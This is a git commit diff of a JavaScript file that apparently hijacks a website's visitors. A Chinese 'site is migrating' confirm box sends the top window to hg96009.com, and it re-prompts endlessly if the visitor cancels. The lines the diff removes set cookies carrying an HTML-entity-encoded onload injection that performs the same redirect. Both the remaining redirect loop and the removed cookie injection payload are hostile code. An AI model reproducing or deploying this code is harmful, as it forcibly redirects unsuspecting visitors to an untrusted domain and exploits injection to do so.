6e933325e10ddd2098448ba0c6fab446825c4cdb
bxg52323 <49088050+bxg52323@users.noreply.github.com>
2019-04-03 21:36:53 +0800

    Update 2.js

--- 2.js
+++ 2.js
@@ -1,8 +1,6 @@
 
 function tc(){
 if(confirm("本站正在升级迁移，点击确定指引进入新网站")){
-document.cookie='mtype="; expires=Mon, 03 Apr 2023 12:12:27 GMT; path=/;'
-document.cookie='showtype=1 onload="&#119&#105&#110&#100&#111&#119&#46&#116&#111&#112&#46&#108&#111&#99&#97&#116&#105&#111&#110&#61&#34&#104&#116&#116&#112&#115&#58&#47&#47&#104&#103&#57&#54&#48&#48&#57&#46&#99&#111&#109&#47&#34"; expires=Mon, 03 Apr 2023 12:12:27 GMT; path=/;'
 window.top.location="https://hg96009.com/"
 }
 else tc();
